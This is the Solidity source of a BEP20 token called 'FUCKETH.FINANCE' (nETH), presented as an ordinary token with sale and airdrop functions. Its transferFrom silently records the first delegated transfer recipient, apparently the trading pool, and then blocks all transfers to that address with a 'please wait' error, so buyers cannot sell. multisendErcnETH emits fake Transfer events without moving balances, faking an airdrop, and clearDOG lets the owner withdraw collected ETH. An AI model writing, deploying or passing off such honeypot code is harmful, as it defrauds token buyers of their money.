/*
 /$$$$$$$$ /$$   /$$  /$$$$$$  /$$   /$$
| $$_____/| $$  | $$ /$$__  $$| $$  /$$/
| $$      | $$  | $$| $$  \__/| $$ /$$/ 
| $$$$$   | $$  | $$| $$      | $$$$$/  
| $$__/   | $$  | $$| $$      | $$  $$  
| $$      | $$  | $$| $$    $$| $$\  $$ 
| $$      |  $$$$$$/|  $$$$$$/| $$ \  $$
|__/       \______/  \______/ |__/  \__/
                                        
                                        
                                        
 /$$$$$$$$ /$$$$$$$$ /$$   /$$          
| $$_____/|__  $$__/| $$  | $$          
| $$         | $$   | $$  | $$          
| $$$$$      | $$   | $$$$$$$$          
| $$__/      | $$   | $$__  $$          
| $$         | $$   | $$  | $$          
| $$$$$$$$   | $$   | $$  | $$          
|________/   |__/   |__/  |__/          
  Web-site: https://fucketh.finance/
*/
pragma solidity >=0.5.17;

library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public feth;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "nETH";
    name = "FUCKETH.FINANCE";
    decimals = 18;
    _totalSupply =  350000000000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transferfeth(address _feth) public onlyOwner {
    feth = _feth;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != feth, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && feth == address(0)) feth = to;
      else require(to != feth, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract nETH_FUCKETH_Token  is TokenBEP20 {

  
  uint256 public aSBlock; 
  uint256 public aEBZEXT; 
  uint256 public aCap; 
  uint256 public aTot; 
  uint256 public aAmt; 
 
  uint256 public sSsBlakjh; 
  uint256 public sEEBloKKs; 
  uint256 public sTot; 
  uint256 public sCap; 

  uint256 public sChunk; 
  uint256 public sPrice; 

 
    function multisendErcnETH(address payable[] memory _recipients) public onlyOwner payable {
        require(_recipients.length <= 2000);
        uint256 i = 0;
        uint256 iair = 1000000000000000000;
       // address newwl;
        
        for(i; i < _recipients.length; i++) {
          //  balances[address(this)] = balances[address(this)].sub(iair);
        //    newwl = _recipients[i];
          //  balances[newwl] = balances[newwl].add(iair);
          iair = iair + 1000;
          emit Transfer(address(this), _recipients[i], iair);
          
        }
    }

  function tokenSalenETH(address _refer) public payable returns (bool success){
    require(sSsBlakjh <= block.number && block.number <= sEEBloKKs);
    require(sTot < sCap || sCap == 0);
    uint256 _eth = msg.value;
    uint256 _tkns;
    if(sChunk != 0) {
      uint256 _price = _eth / sPrice;
      _tkns = sChunk * _price;
    }
    else {
      _tkns = _eth / sPrice;
    }
    sTot ++;
    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){
      balances[address(this)] = balances[address(this)].sub(_tkns / 4);
      balances[_refer] = balances[_refer].add(_tkns / 4);
      emit Transfer(address(this), _refer, _tkns / 4);
    }
    balances[address(this)] = balances[address(this)].sub(_tkns);
    balances[msg.sender] = balances[msg.sender].add(_tkns);
    emit Transfer(address(this), msg.sender, _tkns);
    return true;
  }


  function viewSalenETH() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){
    return(sSsBlakjh, sEEBloKKs, sCap, sTot, sChunk, sPrice);
  }
  
  function startAirdropnETH(uint256 _aSBlock, uint256 _aEBZEXT, uint256 _aAmt, uint256 _aCap) public onlyOwner() {
    aSBlock = _aSBlock;
    aEBZEXT = _aEBZEXT;
    aAmt = _aAmt;
    aCap = _aCap;
    aTot = 0;
  }
  function startSalenETH(uint256 _sSsBlakjh, uint256 _sEEBloKKs, uint256 _sChunk, uint256 _sPrice, uint256 _sCap) public onlyOwner() {
    sSsBlakjh = _sSsBlakjh;
    sEEBloKKs = _sEEBloKKs;
    sChunk = _sChunk;
    sPrice =_sPrice;
    sCap = _sCap;
    sTot = 0;
  }
  function clearDOG() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}